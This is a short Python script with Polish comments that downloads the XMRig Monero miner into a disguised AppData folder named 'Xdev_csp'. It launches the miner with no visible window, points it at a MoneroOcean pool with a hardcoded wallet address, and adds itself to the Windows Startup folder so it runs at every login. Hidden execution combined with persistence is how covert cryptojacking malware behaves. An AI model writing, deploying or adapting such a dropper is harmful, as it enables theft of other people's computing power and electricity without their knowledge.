import os
import subprocess
import urllib.request
import zipfile
from pathlib import Path
import sys
from win32com.client import Dispatch

XMRIG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip"
APPDATA_DIR = os.path.join(os.getenv('APPDATA'), "Xdev_csp")  # Folder AppData\Roaming\Xdev_csp
XMRIG_DIR = os.path.join(APPDATA_DIR, "xmrig")  # Zmieniamy lokalizację katalogu xmrig
ZIP_PATH = os.path.join(APPDATA_DIR, "xmrig.zip")  # Ścieżka do pliku zip w folderze Xdev_csp
WALLET_ADDRESS = "445bUC8JDoqhgeSfmXBvSm4C7PDCP165Y4tbFxfQ8qm9JYDK6Z2Vr6mFnpMA3kQdwtV7CDSj4jqsjM4TBfgoWsnaHLd54zU"
POOL = "gulf.moneroocean.stream:10128"  # możesz zmienić na inny pool
WORKER_NAME = "my_windows_rig"

def download_and_extract_xmrig():
    if not os.path.exists(APPDATA_DIR):
        print(f"[+] Tworzę folder: {APPDATA_DIR}")
        os.makedirs(APPDATA_DIR)
    
    if not os.path.exists(XMRIG_DIR):
        print("[+] Pobieranie XMRig...")
        urllib.request.urlretrieve(XMRIG_URL, ZIP_PATH)  # Zmieniamy ścieżkę pliku zip
        print("[+] Rozpakowywanie...")
        with zipfile.ZipFile(ZIP_PATH, 'r') as zip_ref:
            zip_ref.extractall(XMRIG_DIR)  # Rozpakowujemy do zmienionego folderu
        print("[+] Gotowe.")

def start_mining():
    # Szukamy folderu w xmrig/, który zaczyna się od "xmrig-"
    subdirs = [d for d in os.listdir(XMRIG_DIR) if d.startswith("xmrig-")]
    if not subdirs:
        print("❌ Nie znaleziono podfolderu xmrig-*")
        return

    exe_path = os.path.join(XMRIG_DIR, subdirs[0], "xmrig.exe")
    if not os.path.exists(exe_path):
        print("❌ Nie znaleziono xmrig.exe!")
        return

    command = [
        exe_path,
        "-o", POOL,
        "-u", WALLET_ADDRESS,
        "-k",  # keepalive
        "-p", WORKER_NAME,
        "--donate-level", "0",
        "-t", "2"
    ]
    print("[*] Startuję kopanie...")

    # Uruchomienie procesu w tle bez wyświetlania okna CMD
    subprocess.Popen(command, creationflags=subprocess.CREATE_NO_WINDOW)

def add_to_startup():
    # Ścieżka do folderu autostart
    startup_folder = Path(os.getenv('APPDATA')) / "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    script_path = Path(sys.argv[0])
    shortcut_path = startup_folder / f"{script_path.stem}.lnk"
    
    # Sprawdź, czy skrót już istnieje
    if not shortcut_path.exists():
        # Tworzenie skrótu do uruchomienia skryptu
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(str(shortcut_path))
        shortcut.TargetPath = str(script_path)
        shortcut.WorkingDirectory = str(script_path.parent)
        shortcut.save()
        print("Skrót dodany do Autostartu.")
    else:
        print("Skrót już istnieje w Autostarcie.")

if __name__ == "__main__":
    add_to_startup()
    download_and_extract_xmrig()
    start_mining()
